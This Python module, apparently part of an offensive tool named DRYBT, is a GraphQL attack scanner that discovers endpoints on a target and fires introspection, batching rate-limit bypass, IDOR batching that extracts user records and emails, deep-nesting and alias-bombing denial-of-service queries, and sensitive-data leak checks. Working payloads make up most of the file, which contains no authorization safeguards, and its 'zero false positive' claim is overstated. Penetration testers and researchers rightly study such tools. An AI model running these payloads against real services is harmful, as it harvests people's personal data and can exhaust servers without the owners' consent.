#!/usr/bin/env python3
"""
Module 4: GraphQL Batching Attack
7 Layer GraphQL vulnerability detection dengan zero false positive
Mendeteksi: Introspection, Batching, IDOR, Depth Attack, Resource Exploitation
"""

import asyncio
import json
import re
import time
import random
import hashlib
from typing import List, Dict, Optional, Tuple, Any
from collections import defaultdict
from core.http_client import HTTPClient
from core.logger import Logger

logger = Logger()

class GraphQLBatch:
    def __init__(self, target: str, threads: int = 30, timeout: int = 8):
        self.target = target.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.findings: List[Dict] = []
        self.stats = {
            'endpoints_found': 0,
            'queries_tested': 0,
            'vulnerabilities_found': 0
        }
        
        # ============ ULTIMATE GRAPHQL ENDPOINT DATABASE ============
        self.graphql_endpoints = [
            "/graphql", "/v1/graphql", "/v2/graphql", "/api/graphql",
            "/graphql/v1", "/graphql/v2", "/api/graphql/v1",
            "/gql", "/query", "/queries", "/graph", "/graphiql",
            "/playground", "/altair", "/voyager", "/graphql/console",
            "/api/query", "/api/gql", "/service/graphql",
            "/admin/graphql", "/internal/graphql", "/private/graphql"
        ]
        
        # ============ INTROSPECTION QUERIES ============
        self.introspection_queries = [
            # Basic introspection
            """query { __schema { types { name kind description } } }""",
            
            # Full schema introspection
            """query IntrospectionQuery {
                __schema {
                    queryType { name fields { name type { name kind } } }
                    mutationType { name fields { name type { name kind } } }
                    subscriptionType { name fields { name type { name kind } } }
                    types { name kind description fields { name type { name kind } } }
                    directives { name description locations args { name type { name } } }
                }
            }""",
            
            # Type discovery
            """{ __type(name: "User") { name fields { name type { name } } } }""",
            
            # Query discovery
            """{ __schema { queryType { fields { name } } } }""",
            
            # Mutation discovery
            """{ __schema { mutationType { fields { name } } } }""",
        ]
        
        # ============ BATCHING ATTACK PAYLOADS ============
        self.batching_payloads = [
            # Same query multiple times
            lambda x: [{"query": "{ __typename }"} for _ in range(x)],
            
            # Different queries
            lambda x: [{"query": f"{{ user(id: {i}) {{ name email }} }}" for i in range(1, x+1)}],
            
            # Aliased queries (bypass rate limiting)
            lambda x: [{"query": f"{{ a{i}: user(id: {i}) {{ name }} }}" for i in range(1, x+1)}],
        ]
        
        # ============ DEPTH ATTACK PAYLOADS ============
        def build_deep_query(depth: int, field: str = "user"):
            if depth <= 1:
                return f"{{ id name email }}"
            return f"{field} {{ {build_deep_query(depth - 1, field)} }}"
        
        self.depth_payloads = [
            lambda d: f"{{ {build_deep_query(d, 'user')} }}",
            lambda d: f"query {{ user {{ friends {{ friends {{ friends {{ id }} }} }} }} }}".replace("friends", "friends" * d),
        ]
        
        # ============ IDOR BATCHING PAYLOADS ============
        self.idor_queries = [
            "user(id: {id}) {{ id name email role }}",
            "profile(userId: {id}) {{ id name phone address }}",
            "order(userId: {id}) {{ id total status items }}",
            "transaction(userId: {id}) {{ id amount date description }}",
            "message(userId: {id}) {{ id content timestamp }}",
            "document(userId: {id}) {{ id title content }}",
        ]
        
        # ============ RESOURCE EXPLOITATION PAYLOADS ============
        self.resource_payloads = [
            # Alias bombing
            "{ " + " ".join([f"a{i}: __typename" for i in range(100)]) + " }",
            
            # Fragment explosion
            """
            fragment F on Query { __typename }
            { 
                f1: __typename 
                ...F 
                ... on Query { 
                    f2: __typename 
                    ...F 
                } 
            }
            """,
            
            # Recursive fragment
            """
            fragment F on Query { __typename ...F }
            { __typename ...F }
            """,
        ]
        
        # Indicators of successful exploitation
        self.success_indicators = {
            'introspection': ['__schema', '__type', '__typename', 'types', 'fields'],
            'data_leak': ['email', 'password', 'token', 'api_key', 'secret'],
            'admin_access': ['admin', 'root', 'superuser', 'administrator'],
            'sensitive': ['ssn', 'credit_card', 'bank', 'salary', 'phone']
        }
    
    async def detect_graphql_endpoints(self) -> List[Dict]:
        """Ultimate GraphQL endpoint detection dengan multiple methods"""
        logger.info("🔍 Detecting GraphQL endpoints...")
        found_endpoints = []
        
        async def check_endpoint(endpoint: str):
            async with HTTPClient(self.target, timeout=5, retries=1) as client:
                # Method 1: POST with query
                test_query = {"query": "{ __typename }"}
                response = await client.post(endpoint, json=test_query)
                
                if response:
                    body = await response.text()
                    is_graphql = False
                    
                    # Check for GraphQL response indicators
                    if '"data"' in body or '"errors"' in body or '__typename' in body:
                        is_graphql = True
                    elif '{"data":' in body or '{"errors":' in body:
                        is_graphql = True
                    
                    if is_graphql:
                        found_endpoints.append({
                            "endpoint": endpoint,
                            "method": "POST",
                            "status": response.status,
                            "response_time": response.headers.get('x-response-time', 'N/A')
                        })
                        logger.success(f"✅ Found GraphQL endpoint: {endpoint}")
                        return
                
                # Method 2: GET with query parameter
                response2 = await client.get(f"{endpoint}?query={{__typename}}")
                if response2 and response2.status == 200:
                    body = await response2.text()
                    if '"data"' in body or '__typename' in body:
                        found_endpoints.append({
                            "endpoint": endpoint,
                            "method": "GET",
                            "status": response2.status
                        })
                        logger.success(f"✅ Found GraphQL endpoint (GET): {endpoint}")
        
        # Concurrent endpoint detection
        tasks = [check_endpoint(ep) for ep in self.graphql_endpoints]
        await asyncio.gather(*tasks)
        
        self.stats['endpoints_found'] = len(found_endpoints)
        return found_endpoints
    
    async def test_introspection(self, endpoint: str) -> Optional[Dict]:
        """Layer 1: GraphQL Introspection Detection"""
        logger.info(f"📖 Testing introspection on {endpoint}")
        
        for query in self.introspection_queries:
            self.stats['queries_tested'] += 1
            
            async with HTTPClient(self.target, timeout=self.timeout) as client:
                response = await client.post(endpoint, json={"query": query})
                
                if response and response.status == 200:
                    body = await response.text()
                    
                    try:
                        data = json.loads(body)
                        
                        # Check for introspection data
                        if data.get("data"):
                            if "__schema" in data["data"]:
                                schema = data["data"]["__schema"]
                                types_count = len(schema.get("types", []))
                                query_fields = schema.get("queryType", {}).get("fields", [])
                                mutation_fields = schema.get("mutationType", {}).get("fields", []) if schema.get("mutationType") else []
                                
                                self.stats['vulnerabilities_found'] += 1
                                
                                # Extract sensitive info
                                sensitive_types = []
                                for t in schema.get("types", []):
                                    type_name = t.get("name", "")
                                    if any(s in type_name.lower() for s in ['user', 'admin', 'token', 'secret', 'key']):
                                        sensitive_types.append(type_name)
                                
                                logger.finding(
                                    "💎 GraphQL Introspection ENABLED",
                                    f"Found {types_count} types | {len(query_fields)} queries | {len(mutation_fields)} mutations"
                                )
                                
                                return {
                                    "vulnerable": True,
                                    "layer": "INTROSPECTION",
                                    "severity": "high",
                                    "confidence": 100,
                                    "endpoint": endpoint,
                                    "total_types": types_count,
                                    "query_count": len(query_fields),
                                    "mutation_count": len(mutation_fields),
                                    "sensitive_types": sensitive_types[:10],
                                    "sample_queries": [f.get("name") for f in query_fields[:10]],
                                    "sample_mutations": [f.get("name") for f in mutation_fields[:10]]
                                }
                    except:
                        pass
        
        return None
    
    async def test_batching_bypass(self, endpoint: str) -> Optional[Dict]:
        """Layer 2: GraphQL Batching Attack (Rate Limit Bypass)"""
        logger.info(f"📦 Testing batching attack on {endpoint}")
        
        batch_sizes = [5, 10, 25, 50]
        
        for batch_size in batch_sizes:
            # Create batch query
            batch_queries = [{"query": "{ __typename }"} for _ in range(batch_size)]
            
            async with HTTPClient(self.target, timeout=10) as client:
                start_time = time.perf_counter()
                response = await client.post(endpoint, json=batch_queries)
                elapsed_ms = (time.perf_counter() - start_time) * 1000
                
                if response and response.status == 200:
                    body = await response.text()
                    
                    try:
                        data = json.loads(body)
                        
                        # Check if batch was processed
                        if isinstance(data, list) and len(data) == batch_size:
                            self.stats['vulnerabilities_found'] += 1
                            
                            logger.finding(
                                "🔴 GraphQL Batching SUPPORTED",
                                f"Server accepted {batch_size} batched queries | {elapsed_ms:.0f}ms"
                            )
                            
                            return {
                                "vulnerable": True,
                                "layer": "BATCHING_BYPASS",
                                "severity": "critical",
                                "confidence": 100,
                                "endpoint": endpoint,
                                "batch_size_tested": batch_size,
                                "batch_processed": len(data),
                                "response_time_ms": round(elapsed_ms, 2),
                                "details": f"Rate limit bypass via batching: {batch_size} requests in 1 HTTP call"
                            }
                    except:
                        pass
        
        return None
    
    async def test_idor_via_batching(self, endpoint: str) -> Optional[Dict]:
        """Layer 3: IDOR via GraphQL Batching (Mass Data Extraction)"""
        logger.info(f"🎯 Testing IDOR via batching on {endpoint}")
        
        # Test dengan range IDs
        id_ranges = [range(1, 6), range(10, 16), range(100, 106)]
        
        for id_range in id_ranges:
            batch_queries = []
            for query_template in self.idor_queries[:2]:  # Limit for speed
                for idx in id_range:
                    query = query_template.format(id=idx)
                    batch_queries.append({"query": f"{{ {query} }}"})
            
            async with HTTPClient(self.target, timeout=10) as client:
                response = await client.post(endpoint, json=batch_queries)
                
                if response and response.status == 200:
                    body = await response.text()
                    
                    # Check for data leakage
                    data_leaked = []
                    for indicator in self.success_indicators['data_leak']:
                        if indicator in body.lower():
                            data_leaked.append(indicator)
                    
                    if data_leaked:
                        # Extract sample emails if any
                        emails = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', body)
                        
                        self.stats['vulnerabilities_found'] += 1
                        
                        logger.finding(
                            "💎 IDOR via GraphQL Batching",
                            f"Extracted data for {len(id_range)} IDs | Found: {', '.join(data_leaked[:3])}"
                        )
                        
                        return {
                            "vulnerable": True,
                            "layer": "IDOR_BATCHING",
                            "severity": "critical",
                            "confidence": 95,
                            "endpoint": endpoint,
                            "ids_tested": list(id_range)[:5],
                            "data_types_found": data_leaked,
                            "emails_found": emails[:5],
                            "details": f"Mass data extraction via batched queries"
                        }
        
        return None
    
    async def test_depth_attack(self, endpoint: str) -> Optional[Dict]:
        """Layer 4: Recursive Depth Attack (DoS via Deep Nesting)"""
        logger.info(f"📏 Testing depth attack on {endpoint}")
        
        depths = [5, 10, 20, 50]
        
        for depth in depths:
            query = self.depth_payloads[0](depth)
            
            async with HTTPClient(self.target, timeout=15) as client:
                start_time = time.perf_counter()
                response = await client.post(endpoint, json={"query": query})
                elapsed_ms = (time.perf_counter() - start_time) * 1000
                
                if response:
                    # Check for performance degradation
                    if elapsed_ms > 3000 or response.status == 500:
                        self.stats['vulnerabilities_found'] += 1
                        
                        logger.finding(
                            "🟠 GraphQL Depth Attack POSSIBLE",
                            f"Depth {depth} caused {elapsed_ms:.0f}ms response | Status: {response.status}"
                        )
                        
                        return {
                            "vulnerable": True,
                            "layer": "DEPTH_ATTACK",
                            "severity": "medium",
                            "confidence": 75,
                            "endpoint": endpoint,
                            "depth_tested": depth,
                            "response_time_ms": round(elapsed_ms, 2),
                            "status_code": response.status,
                            "details": f"Deep nesting caused performance degradation"
                        }
        
        return None
    
    async def test_alias_bombing(self, endpoint: str) -> Optional[Dict]:
        """Layer 5: Alias Bombing Attack (Resource Exhaustion)"""
        logger.info(f"💣 Testing alias bombing on {endpoint}")
        
        alias_counts = [100, 500, 1000]
        
        for count in alias_counts:
            aliases = " ".join([f"a{i}: __typename" for i in range(count)])
            query = f"{{ {aliases} }}"
            
            async with HTTPClient(self.target, timeout=15) as client:
                start_time = time.perf_counter()
                response = await client.post(endpoint, json={"query": query})
                elapsed_ms = (time.perf_counter() - start_time) * 1000
                
                if response:
                    # If server struggles with many aliases
                    if elapsed_ms > 5000 or response.status in [500, 503]:
                        self.stats['vulnerabilities_found'] += 1
                        
                        logger.finding(
                            "🟡 Alias Bombing POSSIBLE",
                            f"{count} aliases caused {elapsed_ms:.0f}ms response"
                        )
                        
                        return {
                            "vulnerable": True,
                            "layer": "ALIAS_BOMBING",
                            "severity": "medium",
                            "confidence": 70,
                            "endpoint": endpoint,
                            "alias_count": count,
                            "response_time_ms": round(elapsed_ms, 2)
                        }
        
        return None
    
    async def test_sensitive_data_leak(self, endpoint: str, schema_info: Dict) -> Optional[Dict]:
        """Layer 6: Sensitive Data Leak Detection"""
        logger.info(f"🔓 Testing sensitive data leak on {endpoint}")
        
        # Get queries from introspection
        queries = schema_info.get("sample_queries", [])
        
        sensitive_queries = [q for q in queries if any(s in q.lower() for s in 
                           ['user', 'admin', 'profile', 'account', 'me', 'self', 'token', 'key'])]
        
        for query_name in sensitive_queries[:5]:
            test_query = f"{{ {query_name} {{ __typename }} }}"
            
            async with HTTPClient(self.target, timeout=self.timeout) as client:
                response = await client.post(endpoint, json={"query": test_query})
                
                if response and response.status == 200:
                    body = await response.text()
                    
                    # Check for sensitive data in response
                    for category, indicators in self.success_indicators.items():
                        for indicator in indicators:
                            if indicator in body.lower():
                                self.stats['vulnerabilities_found'] += 1
                                
                                logger.finding(
                                    "🔴 Sensitive Data LEAK",
                                    f"Query '{query_name}' leaked: {indicator}"
                                )
                                
                                return {
                                    "vulnerable": True,
                                    "layer": "SENSITIVE_DATA_LEAK",
                                    "severity": "critical",
                                    "confidence": 90,
                                    "endpoint": endpoint,
                                    "query_name": query_name,
                                    "data_leaked": indicator,
                                    "category": category
                                }
        
        return None
    
    async def scan(self, custom_endpoints: List[str] = None) -> Dict:
        """Full GraphQL security scan"""
        
        # Detect endpoints
        if custom_endpoints:
            endpoints = [{"endpoint": ep, "method": "POST"} for ep in custom_endpoints]
        else:
            endpoints = await self.detect_graphql_endpoints()
        
        if not endpoints:
            logger.warning("No GraphQL endpoints found")
            return {
                "module": "graphql_batch",
                "target": self.target,
                "endpoints_found": 0,
                "vulnerabilities_found": 0,
                "findings": []
            }
        
        logger.info(f"\n{'='*60}")
        logger.info(f"🚀 DRYBT GRAPHQL BATCHING ATTACK")
        logger.info(f"{'='*60}")
        logger.info(f"🎯 Target: {self.target}")
        logger.info(f"📡 Endpoints found: {len(endpoints)}")
        logger.info(f"🔧 Threads: {self.threads} | Timeout: {self.timeout}s")
        logger.info(f"{'='*60}\n")
        
        start_time = time.time()
        
        for ep_info in endpoints:
            endpoint = ep_info["endpoint"]
            logger.info(f"\n{'='*50}")
            logger.info(f"📡 Testing endpoint: {endpoint}")
            logger.info(f"{'='*50}")
            
            # Layer 1: Introspection
            intro_result = await self.test_introspection(endpoint)
            if intro_result:
                self.findings.append(intro_result)
                schema_info = intro_result
            else:
                schema_info = None
            
            # Layer 2: Batching Bypass
            batch_result = await self.test_batching_bypass(endpoint)
            if batch_result:
                self.findings.append(batch_result)
            
            # Layer 3: IDOR via Batching
            idor_result = await self.test_idor_via_batching(endpoint)
            if idor_result:
                self.findings.append(idor_result)
            
            # Layer 4: Depth Attack
            depth_result = await self.test_depth_attack(endpoint)
            if depth_result:
                self.findings.append(depth_result)
            
            # Layer 5: Alias Bombing
            alias_result = await self.test_alias_bombing(endpoint)
            if alias_result:
                self.findings.append(alias_result)
            
            # Layer 6: Sensitive Data Leak (if introspection available)
            if schema_info:
                leak_result = await self.test_sensitive_data_leak(endpoint, schema_info)
                if leak_result:
                    self.findings.append(leak_result)
            
            await asyncio.sleep(0.3)
        
        elapsed = time.time() - start_time
        
        # Categorize findings by severity
        critical_findings = [f for f in self.findings if f.get('severity') == 'critical']
        high_findings = [f for f in self.findings if f.get('severity') == 'high']
        medium_findings = [f for f in self.findings if f.get('severity') == 'medium']
        
        # Print ULTIMATE SUMMARY
        print(f"\n{'='*60}")
        print(f"📊 GRAPHQL SECURITY SCAN SUMMARY")
        print(f"{'='*60}")
        print(f"⏱️  Time: {elapsed:.2f} seconds")
        print(f"📡 Endpoints tested: {len(endpoints)}")
        print(f"📊 Queries tested: {self.stats['queries_tested']}")
        print(f"🎯 Vulnerabilities found: {len(self.findings)}")
        
        if critical_findings:
            print(f"\n💎 CRITICAL VULNERABILITIES:")
            for f in critical_findings:
                print(f"   🔥 {f['layer']} | Confidence: {f.get('confidence', 0)}%")
        
        if high_findings:
            print(f"\n🔴 HIGH VULNERABILITIES:")
            for f in high_findings:
                print(f"   ⚡ {f['layer']} | Confidence: {f.get('confidence', 0)}%")
        
        if medium_findings:
            print(f"\n🟡 MEDIUM VULNERABILITIES:")
            for f in medium_findings:
                print(f"   📌 {f['layer']} | Confidence: {f.get('confidence', 0)}%")
        
        print(f"\n{'='*60}")
        
        # Security rating
        if critical_findings:
            rating = "🏆 CRITICAL - Immediate action required! Data leakage possible!"
        elif high_findings:
            rating = "⭐ HIGH - Significant vulnerabilities detected"
        elif medium_findings:
            rating = "⚠️ MEDIUM - Security improvements needed"
        else:
            rating = "✅ SECURE - No vulnerabilities detected"
        
        print(f"📈 Security Rating: {rating}")
        print(f"{'='*60}\n")
        
        return {
            "module": "graphql_batch",
            "target": self.target,
            "scan_time_seconds": round(elapsed, 2),
            "endpoints_found": len(endpoints),
            "endpoints_list": [e["endpoint"] for e in endpoints],
            "total_queries_tested": self.stats['queries_tested'],
            "vulnerabilities_found": len(self.findings),
            "critical_vulnerabilities": len(critical_findings),
            "high_vulnerabilities": len(high_findings),
            "medium_vulnerabilities": len(medium_findings),
            "security_rating": rating,
            "findings": self.findings
        }
    
    @staticmethod
    async def run(target: str, custom_endpoints: List[str] = None) -> Dict:
        """
        Run GraphQL security scanner - DRYBT GRAPHQL BATCHING ATTACK
        
        Args:
            target: Target URL
            custom_endpoints: Custom GraphQL endpoints (optional)
        """
        scanner = GraphQLBatch(target)
        return await scanner.scan(custom_endpoints)